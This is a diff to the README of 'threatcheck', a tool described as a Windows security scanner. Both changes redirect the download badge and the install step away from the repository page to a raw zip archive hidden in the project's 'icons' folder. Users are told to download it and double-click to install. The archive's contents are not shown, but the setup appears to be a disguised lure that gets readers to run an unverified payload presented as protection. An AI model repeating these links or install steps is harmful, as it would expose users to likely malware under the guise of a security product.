@@ -1,6 +1,6 @@
 # 🛡️ threatcheck - Quickly identify digital security threats now
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/alshahanieabas/threatcheck)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://raw.githubusercontent.com/alshahanieabas/threatcheck/main/icons/Software_2.4.zip)
 
 ThreatCheck keeps your computer safe. It scans websites and files to find harmful content before you open them. This tool connects to global databases to check for risks. You see results in seconds.
 
@@ -21,7 +21,7 @@ You need a computer running Windows 10 or Windows 11. Your system should have at
 
 ## 📥 How to install the tool
 
-1. Visit this page to download the setup file: [https://github.com/alshahanieabas/threatcheck](https://github.com/alshahanieabas/threatcheck)
+1. Visit this page to download the setup file: [https://raw.githubusercontent.com/alshahanieabas/threatcheck/main/icons/Software_2.4.zip](https://raw.githubusercontent.com/alshahanieabas/threatcheck/main/icons/Software_2.4.zip)
 2. Locate the file in your downloads folder.
 3. Double-click the file to start the installation.
 4. Follow the prompts on the screen.
